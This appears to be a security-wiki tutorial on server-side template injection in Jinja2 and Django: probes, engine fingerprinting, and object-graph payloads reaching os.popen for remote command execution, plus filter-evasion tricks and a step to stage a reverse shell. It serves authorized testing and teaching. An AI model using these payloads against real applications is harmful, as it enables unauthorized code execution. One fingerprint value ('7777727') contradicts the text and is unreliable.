---
title: "Jinja2 and Django template SSTI: engine fingerprinting, the object-graph climb, and RCE"
description: Exploiting server-side template injection in Python web stacks—detecting evaluation in Jinja2 and Django, fingerprinting the engine, and walking __mro__/__subclasses__ from a template string to arbitrary command execution.
keywords:
  - SSTI
  - Jinja2
  - Django
  - Flask
  - Python template injection
  - remote code execution
---

# Jinja2 and Django templates

Python web stacks reach a template engine constantly, and two engines dominate: **Jinja2** (Flask, and standalone) and the **Django template language (DTL)**. Server-side template injection appears when user input is concatenated into the template *source* a renderer compiles—`render_template_string(...)`, `Environment.from_string(...)`, or `django.template.Template(...)`—rather than passed as a context variable into a fixed file template.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Use only against systems you are permitted to test.

## Overview

A typical vulnerable Flask sink builds the template by concatenation:

```python
# name comes from an HTTP parameter
from flask import render_template_string
render_template_string("<h1>Hello " + name + "</h1>")
```

The developer expects `name` to be rendered as text. Jinja2, however, parses the whole string as a template, so `name = "{{7*7}}"` is evaluated and the response contains `Hello 49`. The input has crossed from **data** into **template code**. Had the code instead written `render_template_string("<h1>Hello {{ name }}</h1>", name=name)`, the value would be a context variable and `{{7*7}}` would render literally—no injection.

## Detection and fingerprinting

The first probe is a mathematical expression that only a template evaluator would compute. A reflected `49` proves the expression ran:

```
{{7*7}}        → 49   (Jinja2, Twig, and others that evaluate {{ }})
${7*7}         → 49   (JSP EL, Thymeleaf-style, Freemarker variants)
#{7*7}         → 49   (some message/EL syntaxes)
{{7*'7'}}      → 7777727 on Jinja2 ·  49 on Twig
```

That last line is a cheap **engine fingerprint**: Jinja2 performs Python string repetition (`7 * '7'` → `'7777777'`-style behavior, yielding `7777777`), whereas Twig returns `49`. A polyglot such as `${{<%[%'"}}%\` thrown at a reflecting sink tends to raise an engine-specific error that names the stack.

Django's template language is deliberately **restricted**: it does not evaluate arbitrary Python and `{{7*7}}` renders as the literal `{{7*7}}`. So a working `{{7*7}}` points at Jinja2 (or Twig/other), not DTL. Confirming *which* Python engine you face decides the entire exploitation path, because the object-graph syntax differs.

## Jinja2: from expression to object graph

Once `{{ }}` evaluates, the goal is to reach a Python object that can import modules or spawn a process. Jinja2 exposes several entry objects even in a bare context:

- `config` — in Flask, the application config object; leaks secrets and, via its methods, reaches the class hierarchy.
- `self`, `request`, `g` — request-scoped objects whose attributes open the runtime.
- Any string or number literal, whose `__class__` begins the climb.

The classic chain walks Python's class machinery from a primitive up to a dangerous callable:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

`''.__class__` is `str`; `.__mro__[1]` is `object`; `.__subclasses__()` lists every subclass loaded in the interpreter. Index into that list to find a class whose constructor or methods reach the OS—`subprocess.Popen`, `os._wrap_close`, a warnings-catcher that holds a reference to `__builtins__`:

```
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
```

The index is version-dependent, so enumerate the list first and locate `Popen` by name. A more portable route reaches `__builtins__` and imports directly:

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

Each of these is a different path to the same primitive—`os.popen(...).read()`—so if one object is filtered, another often remains. When the `SandboxedEnvironment` is in play, these direct attribute walks are blocked and you move to [sandbox escape](ssti-sandbox-escape.md) techniques.

### Statement blocks and filters

Distinguish **expression** injection in `{{ }}` from **control structures** in `{% %}`. Where the sink accepts statement syntax, `{% for %}`/`{% set %}` loops let you enumerate `__subclasses__()` output inline to locate the right index without copying it out. Jinja filters (`|attr`, `|map`, `|join`) are also useful for **filter evasion**: `request|attr('application')` reaches an attribute when `.` or `[]` is blocklisted, and `attr()` sidesteps filters that scan for `__`.

## Django: narrower surface

DTL cannot call arbitrary methods or index into the object graph, so RCE-grade SSTI is the exception, not the rule. The realistic findings are:

- **Information disclosure** through built-in tags and the `{% debug %}` tag, or settings exposed in context.
- **Logic abuse** in rare `django.template.base.Template(user_string)` misuse where the template source itself is attacker-built—still constrained to DTL's tag/filter set rather than Python.
- **Secondary sinks** where a custom filter or tag is implemented unsafely (e.g., a tag that `eval`s its argument), which is really [expression evaluation](../expression-evaluation/index.md) wearing a template costume.

When assessing a Django app, the high-value question is whether any code path hands user input to `Template()`/`Engine.from_string()` as *source*, versus the overwhelmingly common and safe case of a fixed template rendered with a user-populated context.

## Exploitation workflow

1. **Confirm evaluation.** Send `{{7*7}}` (and `${7*7}`, `#{7*7}` to cover neighbors). A computed result, not the literal, means a live sink.
2. **Fingerprint.** Use `{{7*'7'}}` and an error-raising polyglot to separate Jinja2 from Twig/DTL/others.
3. **Map reachable objects.** Probe `config`, `self`, `request`, and `''.__class__` to see what the context exposes.
4. **Climb to a primitive.** Walk `__mro__`/`__subclasses__` or a `__globals__` path to `os.popen`/`subprocess.Popen`.
5. **Stabilize.** Once one command runs, stage a reverse shell rather than cramming payloads through the parameter.

## Tools

- **[tplmap](https://github.com/epinna/tplmap)** — automates SSTI detection and exploitation across Jinja2, Twig, and other engines (use only where authorized).
- **[Burp Suite](https://portswigger.net/burp)** (Repeater, Intruder) for manual probing, fingerprint polyglots, and fuzzing the `__subclasses__` index.
- **Local Python with the pinned Jinja2 version** to enumerate `__subclasses__()` offline and pre-compute indices before firing at the target.

## References

- [PortSwigger Web Security Academy: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger: Exploiting SSTI with a documented syntax (Jinja2)](https://portswigger.net/web-security/server-side-template-injection/exploiting)
- [CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)
- [PayloadsAllTheThings: Server Side Template Injection — Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
